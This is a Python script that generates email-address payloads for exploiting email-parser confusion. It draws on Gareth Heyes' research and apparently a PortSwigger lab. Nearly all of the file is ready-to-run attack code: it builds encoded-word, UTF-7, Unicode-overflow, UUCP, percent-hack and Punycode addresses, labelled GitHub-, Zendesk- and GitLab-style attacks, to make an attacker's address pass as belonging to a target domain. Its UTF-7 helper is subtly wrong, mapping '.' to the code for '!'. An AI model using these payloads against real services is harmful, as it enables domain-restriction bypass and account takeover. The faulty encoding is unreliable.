#!/usr/bin/env python3
"""
Email Parser Vulnerability Testing Tool
Based on the research from "Splitting the email atom" by Gareth Heyes
"""

import argparse
import sys
import base64

class EmailFuzzer:
    def __init__(self, attacker_email, target_domain):
        self.attacker_email, self.attacker_domain = self._split_email(attacker_email)
        self.target_domain = target_domain
        self.payloads = []

    def _split_email(self, email):
        """Split an email into username and domain parts"""
        parts = email.split('@')
        if len(parts) != 2:
            print(f"Error: Invalid email format: {email}")
            sys.exit(1)
        return parts[0], parts[1]

    def generate_encoded_word_payloads(self):
        """Generate payloads using Q-encoding (Encoded-Word)"""
        # Basic encoded-word probes
        self.payloads.append({
            'name': 'Basic Q-encoding (ISO-8859-1)',
            'payload': f'=?iso-8859-1?q?{self.attacker_email}?=@{self.target_domain}',
            'description': 'Basic Q-encoded email in ISO-8859-1 charset'
        })
        
        self.payloads.append({
            'name': 'Basic Q-encoding (UTF-8)',
            'payload': f'=?utf-8?q?{self.attacker_email}?=@{self.target_domain}',
            'description': 'Basic Q-encoded email in UTF-8 charset'
        })
        
        # UTF-7 encoding which bypasses some filters
        self.payloads.append({
            'name': 'UTF-7 Encoded',
            'payload': f'=?utf-7?q?{self._utf7_encode(self.attacker_email)}?=@{self.target_domain}',
            'description': 'UTF-7 encoded email address - often bypasses filters'
        })
        
        # Encode @ symbol in attacker email
        at_encoded = self.attacker_email.replace('@', '&AEA-')
        self.payloads.append({
            'name': 'UTF-7 with encoded @ symbol',
            'payload': f'=?utf-7?q?{at_encoded}&ACA-?=@{self.target_domain}',
            'description': 'UTF-7 encoding with @ symbol encoded, followed by space'
        })
        
        # Complex examples from the paper
        self.payloads.append({
            'name': 'GitHub style attack',
            'payload': f'=?x?q?{self.attacker_email}=40{self.attacker_domain}=3e=00?=foo@{self.target_domain}',
            'description': 'GitHub style attack with encoded @ (=40), > (=3e), and null (=00)'
        })
        
        self.payloads.append({
            'name': 'Zendesk style attack',
            'payload': f'=?x?q?{self.attacker_email}=40{self.attacker_domain}=22=3c22=3e=00?=foo@{self.target_domain}',
            'description': 'Zendesk style attack with complex encoding pattern'
        })
        
        self.payloads.append({
            'name': 'GitLab style attack (underscore)',
            'payload': f'{self.attacker_email}@{self.attacker_domain}=?utf-8?q?_?=@{self.target_domain}',
            'description': 'GitLab style attack using underscore as encoded space'
        })
        
        self.payloads.append({
            'name': 'GitLab style attack (space)',
            'payload': f'=?iso-8859-1?q?{self.attacker_email}=40{self.attacker_domain}=3e=20?=@{self.target_domain}',
            'description': 'GitLab style attack with encoded @ (=40), > (=3e), and space (=20)'
        })

    def generate_unicode_overflow_payloads(self):
        """Generate payloads using Unicode overflow technique"""
        # Basic unicode overflow for @ symbol (0x40)
        self.payloads.append({
            'name': 'Unicode overflow @ (0x100)',
            'payload': f'{self.attacker_email}{chr(0x100 + 0x40)}{self.attacker_domain}@{self.target_domain}',
            'description': 'Unicode overflow generating @ symbol using codepoint 0x100+0x40'
        })
        
        self.payloads.append({
            'name': 'Unicode overflow @ (0x1000)',
            'payload': f'{self.attacker_email}{chr(0x1000 + 0x40)}{self.attacker_domain}@{self.target_domain}',
            'description': 'Unicode overflow generating @ symbol using codepoint 0x1000+0x40'
        })
        
        # Generate a few more unicode overflows for common symbols
        symbols = {
            '@': 0x40,  # @ symbol
            '>': 0x3e,  # > symbol
            '<': 0x3c,  # < symbol
            ';': 0x3b,  # ; symbol
            '(': 0x28,  # ( symbol
            ')': 0x29   # ) symbol
        }
        
        for sym_name, sym_code in symbols.items():
            self.payloads.append({
                'name': f'Unicode overflow {sym_name} (0x100)',
                'payload': f'{self.attacker_email}{chr(0x100 + sym_code)}{self.attacker_domain}@{self.target_domain}',
                'description': f'Unicode overflow generating {sym_name} symbol using codepoint 0x100+{hex(sym_code)}'
            })

    def generate_uucp_and_percent_attacks(self):
        """Generate UUCP and percent hack attacks"""
        # UUCP style attack
        self.payloads.append({
            'name': 'UUCP attack',
            'payload': f'{self.attacker_domain}!{self.attacker_email}\\@{self.target_domain}',
            'description': 'UUCP protocol attack that may route to a different server'
        })
        
        # Percent hack
        self.payloads.append({
            'name': 'Percent hack',
            'payload': f'{self.attacker_email}%{self.attacker_domain}@{self.target_domain}',
            'description': 'Percent hack that may route via target_domain to attacker_domain'
        })
        
        # Source routes with comments
        self.payloads.append({
            'name': 'Source route with comments',
            'payload': f'{self.attacker_email}%{self.attacker_domain}(@{self.target_domain}',
            'description': 'Source route with comments that may be misinterpreted'
        })

    def generate_punycode_attacks(self):
        """Generate Punycode based attacks"""
        # Basic punycode example
        self.payloads.append({
            'name': 'Basic Punycode example',
            'payload': f'{self.attacker_email}@xn--mnchen-3ya.{self.target_domain}',
            'description': 'Basic Punycode domain (münchen) to test parsing'
        })
        
        # Malformed Punycode examples
        self.payloads.append({
            'name': 'Malformed Punycode (comma)',
            'payload': f'{self.attacker_email}@xn--0049.{self.target_domain}',
            'description': 'Malformed Punycode that may generate a comma'
        })
        
        self.payloads.append({
            'name': 'Malformed Punycode (at symbol)',
            'payload': f'{self.attacker_email}@xn--024.{self.target_domain}',
            'description': 'Malformed Punycode that may generate an @ symbol'
        })

    def generate_combination_attacks(self):
        """Generate combined attack techniques"""
        # Combine UTF-7 with quotes
        self.payloads.append({
            'name': 'UTF-7 with quotes',
            'payload': f'"=?utf-7?q?{self._utf7_encode(self.attacker_email+"@"+self.attacker_domain)}?="@{self.target_domain}',
            'description': 'UTF-7 encoding inside quoted local-part'
        })
        
        # Combine encoded-word with base64
        b64_encoded = base64.b64encode(f'{self.attacker_email}@{self.attacker_domain}'.encode()).decode()
        self.payloads.append({
            'name': 'Base64 encoded-word',
            'payload': f'=?utf-8?b?{b64_encoded}?=@{self.target_domain}',
            'description': 'Base64 encoded email using encoded-word'
        })
        
        # UTF-7 with base64
        b64_encoded = base64.b64encode(f'=?utf-7?q?{self._utf7_encode(self.attacker_email+"@"+self.attacker_domain)}?='.encode()).decode()
        self.payloads.append({
            'name': 'UTF-7 and Base64 combo',
            'payload': f'=?utf-8?b?{b64_encoded}?=@{self.target_domain}',
            'description': 'Complex attack combining UTF-7 and Base64 encoding'
        })

    def _utf7_encode(self, text):
        """Basic UTF-7 encoding for demonstration purposes"""
        # This is a simplified version - for real UTF-7 use a proper library
        result = ""
        for char in text:
            if ord(char) < 128 and char.isalnum():
                result += char
            elif char == '@':
                result += '&AEA-'  # @ in UTF-7
            elif char == ' ':
                result += '&ACA-'  # space in UTF-7
            elif char == '.':
                result += '&ACE-'  # dot in UTF-7
            else:
                # Add more special characters as needed
                result += char
        return result

    def generate_all_payloads(self):
        """Generate all payloads"""
        self.generate_encoded_word_payloads()
        self.generate_unicode_overflow_payloads()
        self.generate_uucp_and_percent_attacks()
        self.generate_punycode_attacks()
        self.generate_combination_attacks()
        
        # Generate specific lab solution
        self.payloads.append({
            'name': 'PortSwigger Lab Solution',
            'payload': f'=?utf-7?q?{self.attacker_email}&AEA-{self.attacker_domain}&ACA-?=@{self.target_domain}',
            'description': 'The specific solution for the PortSwigger lab (UTF-7 encoded)'
        })
        
        return self.payloads

    def print_payloads(self):
        """Print all generated payloads in a formatted way"""
        print(f"\n=== Email Parser Vulnerability Testing Tool ===")
        print(f"Attacker email: {self.attacker_email}@{self.attacker_domain}")
        print(f"Target domain: {self.target_domain}")
        print(f"Generated {len(self.payloads)} payloads\n")
        
        for i, payload in enumerate(self.payloads, 1):
            print(f"{i}. {payload['name']}")
            print(f"   Payload: {payload['payload']}")
            print(f"   Description: {payload['description']}")
            print()

def main():
    parser = argparse.ArgumentParser(description='Generate email address payloads for testing email parser vulnerabilities')
    parser.add_argument('attacker_email', help='Attacker email address (e.g., attacker@example.com)')
    parser.add_argument('target_domain', help='Target domain to bypass (e.g., company.com)')
    parser.add_argument('--output', '-o', help='Output file to save payloads', default=None)
    
    args = parser.parse_args()
    
    # Split attacker email if provided as full email
    attacker_email = args.attacker_email
    if '@' in attacker_email:
        attacker_email = args.attacker_email
    else:
        print(f"Error: Attacker email must include @ symbol")
        sys.exit(1)
    
    # Initialize fuzzer
    fuzzer = EmailFuzzer(attacker_email, args.target_domain)
    
    # Generate all payloads
    fuzzer.generate_all_payloads()
    
    # Print payloads
    fuzzer.print_payloads()
    
    # Save to file if requested
    if args.output:
        with open(args.output, 'w') as f:
            f.write("Email Parser Vulnerability Testing Tool\n")
            f.write(f"Attacker email: {attacker_email}\n")
            f.write(f"Target domain: {args.target_domain}\n\n")
            
            for i, payload in enumerate(fuzzer.payloads, 1):
                f.write(f"{i}. {payload['name']}\n")
                f.write(f"   Payload: {payload['payload']}\n")
                f.write(f"   Description: {payload['description']}\n\n")
                
        print(f"Payloads saved to {args.output}")

if __name__ == "__main__":
    main()